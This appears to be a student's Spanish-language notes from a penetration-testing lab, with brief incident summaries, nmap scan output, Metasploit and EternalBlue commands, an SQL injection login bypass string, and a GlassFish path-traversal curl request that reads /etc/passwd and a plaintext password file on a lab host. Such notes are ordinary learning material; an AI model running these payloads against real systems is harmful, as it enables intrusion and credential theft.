@@ -1,0 +1,415 @@
+CASO REAL 01 >>>>> dipole >>>> conexion desde Rusia >>> VPN desde Rusia >>> Usuario creado en 2016 >>> Inicio de sesion a las 11 noche >>> Intenta lista grupos y enviar a carpeta compartida >>> Objetivo establecer conexion para obtener persistencia en el servidor >>>> ACCCIONES >>> Deshabilitar usuario dipole, cortar conexiones VPN entrantes, restriccion conexiones RUSIA y cambio de Contrasenas y Uso de LAPS
+
+Entro porque habia una debillidad en el router de la empresa >>>> Fallo del sistema, no empresa >>> Fuerza bruta
+
+
+CASO REAL 02 >>> noadmin.bat >>>> Alguien intento hacer algo para jugar, un usuario de la empresa >>>> HAcer informe para la empresa y que ellos tomen las medidas adecuadas
+
+
+
+Practicas de ahora >>> NMAP y MetaSploit
+
+Todos conectados a la red 192.168.0/24
+
+
+└─$ nmap 192.168.222.0/24
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-18 06:57 -0400
+Nmap scan report for 192.168.222.1
+Host is up (0.00088s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+111/tcp  open  rpcbind
+3128/tcp open  squid-http
+
+Nmap scan report for 192.168.222.50
+Host is up (0.00099s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 192.168.222.101
+Host is up (0.00095s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 192.168.222.102
+Host is up (0.00086s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 192.168.222.103
+Host is up (0.00095s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+4848/tcp open  appserv-http
+7676/tcp open  imqbrokerd
+8080/tcp open  http-proxy
+8181/tcp open  intermapper
+
+Nmap scan report for 192.168.222.104
+Host is up (0.00098s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5432/tcp open  postgresql
+
+Nmap scan report for 192.168.222.208
+Host is up (0.0012s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Nmap done: 256 IP addresses (7 hosts up) scanned in 5.14 seconds
+
+
+
+
+
+
+
+Resultado de nmap -A
+
+
+└─$ nmap -A 192.168.222.208
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-18 07:13 -0400
+Nmap scan report for 192.168.222.208
+Host is up (0.0016s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7600 microsoft-ds
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Device type: general purpose|media device
+Running: Microsoft Windows 2008|7|10|Vista|8.1, Microsoft embedded
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows Server 2008 R2 SP1 or Windows 7 SP1, Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One, Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
+Network Distance: 3 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-18T11:14:51
+|_  start_date: 2026-05-18T09:13:12
+|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: WIN-QGB1LEHMSSJ, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:78:39:aa (Proxmox Server Solutions GmbH)
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7600 (Windows Server 2008 R2 Standard 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::-
+|   Computer name: WIN-QGB1LEHMSSJ
+|   NetBIOS computer name: WIN-QGB1LEHMSSJ\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-05-18T13:14:51+02:00
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT     ADDRESS
+1   0.95 ms 192.168.0.1
+2   1.10 ms 192.168.0.102
+3   1.83 ms 192.168.222.208
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.24 seconds
+                                                                                                            
+
+
+
+
+
+El que expuso uso namp -sV -sC -O 192.168.222.208
+
+└─$ nmap -sV -sC -O 192.168.222.208
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-18 07:16 -0400
+Nmap scan report for 192.168.222.208
+Host is up (0.0014s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7600 microsoft-ds
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Device type: general purpose
+Running: Microsoft Windows 2008|7|Vista|8.1
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
+Network Distance: 3 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7600 (Windows Server 2008 R2 Standard 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::-
+|   Computer name: WIN-QGB1LEHMSSJ
+|   NetBIOS computer name: WIN-QGB1LEHMSSJ\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-05-18T13:17:41+02:00
+|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -1s
+| smb2-time: 
+|   date: 2026-05-18T11:17:41
+|_  start_date: 2026-05-18T09:13:12
+|_nbstat: NetBIOS name: WIN-QGB1LEHMSSJ, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:78:39:aa (Proxmox Server Solutions GmbH)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds
+
+
+
+
+
+
+
+
+
+
+
+que es un cft?
+
+
+Ping de las tablets >>>> Que hacer para que no te llamen >>>> Quitar Pin de las tablets
+
+
+Mikrotik y campos sin internet >>>> Poner una segunda
+conexion a internet
+
+
+CASO REAL 01 >>>>> dipole >>>> conexion desde Rusia >>> VPN desde Rusia >>> Usuario creado en 2016 >>> Inicio de sesion a las 11 noche >>> Intenta lista grupos y enviar a carpeta compartida >>> Objetivo establecer conexion para obtener persistencia en el servidor >>>> ACCCIONES >>> Deshabilitar usuario dipole, cortar conexiones VPN entrantes, restriccion conexiones RUSIA y cambio de Contrasenas y Uso de LAPS
+
+Entro porque habia una debillidad en el router de la empresa >>>> Fallo del sistema, no empresa >>> Fuerza bruta
+
+
+CASO REAL 02 >>> noadmin.bat >>>> Alguien intento hacer algo para jugar, un usuario de la empresa >>>> HAcer informe para la empresa y que ellos tomen las medidas adecuadas
+
+
+
+Practicas de ahora >>> NMAP y MetaSploit
+
+Todos conectados a la red 192.168.0/24
+
+
+Escanear todo lo que hay en la subred 192.168.222.0/24
+
+Si hacemos nmap guion a es de manera mas agresiva??????
+
+
+Nos centramos en el .208
+
+Tiene una serie de puertos abiertos que son desconocidos.
+Intentar descubrir Sistemas Operativos que tiene y que son esos puertos.
+
+Esto es lo que funciona >>>> nmap -O 192.168.222.208
+
+En teoria deberia usar --osscan-guess y --osscan-limit
+
+
+nmap -A es mas agresivo y tarda mucho mas tiempo
+
+
+El que espuso uso namp -sV -sC -O 192.168.222.208
+
+
+Ahora pasamos a metasploit
+Hacer Scaner y que se quede guardado el resultado
+Importar/Exportar archivo XML
+
+El esta ejecutando 
+
+
+db_nmap -sV -sC -O 192.168.222.208
+
+
+Una vez que tenemos el Workspace cuando se conecta a la base de datos postgresql de metasploit, veremos los descubrimientos que hayamos hecho
+
+
+
+
+
+
+
+
+
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ NO CONSIGO QUE SE CONECTA A LA BASE DE DATOS DE POSTGRESQL EL METAESPLOIT
+
+
+dentro del workspace =====
+
+
+Vemos los servicios/// Puertos que se pueden escanear del host 208. Se clasifican con un número que está a la izquierda y se indica el tipo de escaner que se puede
+hacer sobre ellos.
+
+Con info indica en teoría para que sirve el ervicio.
+
+Nombre
+
+
+
+Vulnerabilidad muy famoso === de SMB y WINDOWS ==== eternalblue
+
+use/exploit/Windows/smb/ss17_010_eternalblue
+
+
+nos pedirá algunas opciones
+
+set RHOSTS 192.168.222.208
+
+exploit === ¿QUE MUESTRA?? Hace el exploit
+
+                                                                               
+CrackStation para descifrar password hasheadas
+
+hasdump
+
+
+
+msf > hosts
+
+Hosts
+=====
+
+address          mac  name  os_name       os_flavor  os_sp  purpose  info  comments
+-------          ---  ----  -------       ---------  -----  -------  ----  --------
+192.168.222.208             Windows 2008                    server
+
+msf > services
+Services
+========
+
+host             port   proto  name          state  info                                         resource  parents
+----             ----   -----  ----          -----  ----                                         --------  -------
+192.168.222.208  135    tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn                {}
+192.168.222.208  445    tcp    microsoft-ds  open   Windows Server 2008 R2 Standard 7600 micros  {}
+                                                    oft-ds
+192.168.222.208  49152  tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  49153  tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  49154  tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  49155  tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  49156  tcp    msrpc         open   Microsoft Windows RPC                        {}
+192.168.222.208  49157  tcp    msrpc         open   Microsoft Windows RPC                        {}
+
+msf > 
+
+
+set sessions 192.168.222.208
+Para establecer al host sobre el que actuar
+
+
+
+SQL Injection
+
+Select * from acceso where usuario ='pepe' AND contraseña='pepe2026'
+Select * from acceso where usuario ='pepe' or 1=1-- -' contraseña=''
+
+User: juanito
+PASS: macande
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -k -i 'https://192.168.222.103:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+
+HTTP/1.1 200 OK
+Server: GlassFish Server Open Source Edition  4.1 
+X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1  Java/Oracle Corporation/1.8)
+Last-Modified: Mon, 18 May 2026 10:58:12 GMT
+Date: Mon, 18 May 2026 12:53:02 GMT
+Transfer-Encoding: chunked
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+yoki:x:1000:1000::/home/yoki:/bin/bash
+
+
+
+
+https://192.168.222.103:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/yoki
+
+
+.bash_logout
+.bashrc
+.profile
+.ssh
+access-remember.txt
+
+
+
+https://192.168.222.103:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/yoki/access-remember.txt
+
+yoki;yoki123
+
+
+
+
